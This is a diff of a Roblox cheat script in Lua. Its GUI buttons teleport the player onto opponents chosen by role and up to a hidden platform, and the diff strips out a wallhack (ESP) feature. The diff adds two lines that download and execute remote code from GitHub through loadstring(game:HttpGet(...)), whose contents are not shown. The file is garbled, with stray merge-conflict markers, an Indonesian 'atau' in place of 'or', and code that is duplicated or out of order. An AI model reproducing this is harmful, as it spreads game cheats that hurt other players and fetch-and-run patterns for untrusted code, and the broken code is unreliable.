@@ -35,10 +35,12 @@ local function createStyledButton(parent, text, position)
 end
 
 local function animateButton(button)
+    local tweenService = game:GetService("TweenService")
     local goal = {BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)}
     local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, true)
     local tween = tweenService:Create(button, tweenInfo, goal)
     button.MouseButton1Click:Connect(function()
+        print(button.Text .. " clicked")
         tween:Play()
     end)
 end
@@ -54,27 +56,36 @@ frame.BackgroundTransparency = 1
 frame.Parent = screenGui
 
 local buttonSpacing = 0.25
-local teleportButton = createStyledButton(frame, "Teleport / Back (B/FreezeRunner)", UDim2.new(0, 0, 0 * buttonSpacing, 0))
+local teleportButton = createStyledButton(frame, "Teleport Back", UDim2.new(0, 0, 0 * buttonSpacing, 0))
 local teleportAndCreateBlockButton = createStyledButton(frame, "Teleport & Create Blocks", UDim2.new(0, 0, 1 * buttonSpacing, 0))
 local refreshTeleportButton = createStyledButton(frame, "Refresh Teleport", UDim2.new(0, 0, 2 * buttonSpacing, 0))
-local createEspButton = createStyledButton(frame, "Create Esp", UDim2.new(0, 0, 3 * buttonSpacing, 0))
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/gefbymeind2/main/check%20role"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gitolan/gefop-/main/creditgef.txt"))()
 
 animateButton(teleportButton)
 animateButton(teleportAndCreateBlockButton)
 animateButton(refreshTeleportButton)
-animateButton(createEspButton)
 
 local initialPosition
 local isTeleported = false
 local lastTeleportedPlayer
 local createdBlocks = 0
 local maxBlocks = 2
+<<<<<<< HEAD
+local hitboxCount = 0
+local maxHitboxes = 2
+local activeHitboxes = {}
+=======
 local blockInstances = {}
+>>>>>>> 07bd636ed4cc3817d82fb781d5e77f362e2f1666
 
+=======
 local debounce = false
 local heartbeatConnections = {}
 local EspConnections = {}
 
+>>>>>>> 07bd636ed4cc3817d82fb781d5e77f362e2f1666
 local function teleportToPlayer(targetPlayer)
     initialPosition = player.Character.PrimaryPart.Position
     player.Character:SetPrimaryPartCFrame(targetPlayer.Character.PrimaryPart.CFrame)
@@ -91,10 +102,16 @@ local function findNextPlayer()
     for _, otherPlayer in ipairs(Players:GetPlayers()) do
         if otherPlayer ~= player and otherPlayer ~= lastTeleportedPlayer and otherPlayer:FindFirstChild("PlayerRole") then
             local otherPlayerRole = otherPlayer.PlayerRole.Value
+<<<<<<< HEAD
+            if (otherPlayerRole == "Crown" or otherPlayerRole == "Runner" or otherPlayerRole == "Survivor" atau otherPlayerRole == "Juggernaut" or otherPlayerRole == "B/FreezeRunner") or
+               (playerRole == "RedTeam" and otherPlayerRole == "BlueTeam") or (playerRole == "BlueTeam" and otherPlayerRole == "RedTeam") then
+                return otherPlayer
+=======
             if otherPlayerRole ~= "Dead" and ((playerRole == "Runner" and otherPlayerRole == "Frozen") or 
                (otherPlayerRole == "Crown" or otherPlayerRole == "Runner" or otherPlayerRole == "Survivor" or otherPlayerRole == "Juggernaut" or otherPlayerRole == "B/FreezeRunner" or otherPlayerRole == "B/Crown" or otherPlayerRole == "Alone" or otherPlayerRole == "Frozen") or
                (playerRole == "RedTeam" and otherPlayerRole == "BlueTeam") or (playerRole == "BlueTeam" and otherPlayerRole == "RedTeam")) then
                 table.insert(eligiblePlayers, otherPlayer)
+>>>>>>> 07bd636ed4cc3817d82fb781d5e77f362e2f1666
             end
         end
     end
@@ -123,14 +140,12 @@ if #eligiblePlayers > 0 then
 end
 
 local function toggleTeleport()
-    if debounce then return end
-    debounce = true
-
+    print("toggleTeleport called")
     if isTeleported then
         if initialPosition then
             player.Character:SetPrimaryPartCFrame(CFrame.new(initialPosition))
             isTeleported = false
-            teleportButton.Text = "Teleport / Back (B/FreezeRunner)"
+            teleportButton.Text = "Teleport Back"
         end
     else
         local targetPlayer = findNextPlayer()
@@ -143,10 +158,27 @@ local function toggleTeleport()
             teleportButton.Text = "Teleport / Back (B/FreezeRunner)"
         end
     end
-
-    debounce = false
 end
 
+<<<<<<< HEAD
+local function teleportAndCreateBlock()
+    print("teleportAndCreateBlock called")
+    if createdBlocks < maxBlocks then
+        initialPosition = player.Character.PrimaryPart.Position
+        player.Character:SetPrimaryPartCFrame(CFrame.new(0, 400, 0))
+        isTeleported = true
+        teleportButton.Text = "Return to Starting Position"
+        local block = Instance.new("Part")
+        block.Size = Vector3.new(200, 3, 200)
+        block.Position = Vector3.new(0, 397, 0)
+        block.Anchored = true
+        block.Material = Enum.Material.Plastic
+        block.Color = Color3.new(1, 1, 1)
+        block.Transparency = 0.9
+        block.Parent = workspace
+        createdBlocks = createdBlocks + 1
+    end
+=======
     initialPosition = player.Character.PrimaryPart.Position
     player.Character:SetPrimaryPartCFrame(CFrame.new(0, 400, 0))
     isTeleported = true
@@ -165,91 +197,19 @@ end
     createdBlocks = createdBlocks + 1
 
     debounce = false
+>>>>>>> 07bd636ed4cc3817d82fb781d5e77f362e2f1666
 end
 
 local function refreshTeleport()
-    if debounce then return end
-    debounce = true
-
+    print("refreshTeleport called")
     if isTeleported then
         local targetPlayer = findNextPlayer()
         if targetPlayer then
             teleportToPlayer(targetPlayer)
         end
     end
-
-    debounce = false
 end
-
-
-    local notification = Instance.new("TextLabel")
-    notification.Size = UDim2.new(0, 270, 0, 50)
-    notification.Position = UDim2.new(0.5, -150, 0.1, 0)
-    notification.Text = "Esp Created!"
-    notification.TextScaled = true
-    notification.BackgroundTransparency = 0.5
-    notification.BackgroundColor3 = Color3.new(0, 0, 0)
-    notification.TextColor3 = Color3.new(1, 1, 1)
-    notification.Parent = screenGui
-
-    game:GetService("Debris"):AddItem(notification, 2) -- Menghapus notifikasi setelah 2 detik
-
-    debounce = false
-end
-
--- Auto-update Esps every 10 seconds
-local elapsed = 0
-runService.Heartbeat:Connect(function(deltaTime)
-    elapsed = elapsed + deltaTime
-    if elapsed >= 10 then
-        createEspForPlayers()
-        elapsed = 0
-    end
-end)
 
 teleportButton.MouseButton1Click:Connect(toggleTeleport)
 teleportAndCreateBlockButton.MouseButton1Click:Connect(teleportAndCreateBlock)
 refreshTeleportButton.MouseButton1Click:Connect(refreshTeleport)
-createEspButton.MouseButton1Click:Connect(createEspForPlayers)
-
--- Function to maintain debouncing for teleport and create block button
-local function resetDebounceAfterDelay()
-    wait(0.5)
-    debounce = false
-end
-
--- Adjust teleport and create block function to handle debounce correctly
-local function teleportAndCreateBlock()
-    if debounce then return end
-    debounce = true
-
-    if createdBlocks >= maxBlocks then
-        -- Remove the oldest block
-        if #blockInstances > 0 then
-            local oldestBlock = table.remove(blockInstances, 1)
-            oldestBlock:Destroy()
-            createdBlocks = createdBlocks - 1
-        end
-    end
-
-    initialPosition = player.Character.PrimaryPart.Position
-    player.Character:SetPrimaryPartCFrame(CFrame.new(0, 400, 0))
-    isTeleported = true
-    teleportButton.Text = "Return to Starting Position"
-
-    local block = Instance.new("Part")
-    block.Size = Vector3.new(200, 3, 200)
-    block.Position = Vector3.new(0, 397, 0)
-    block.Anchored = true
-    block.Material = Enum.Material.Plastic
-    block.Color = Color3.new(1, 1, 1)
-    block.Transparency = 0.9
-    block.Parent = workspace
-
-    table.insert(blockInstances, block)
-    createdBlocks = createdBlocks + 1
-
-    resetDebounceAfterDelay()
-end
-
-teleportAndCreateBlockButton.MouseButton1Click:Connect(teleportAndCreateBlock)
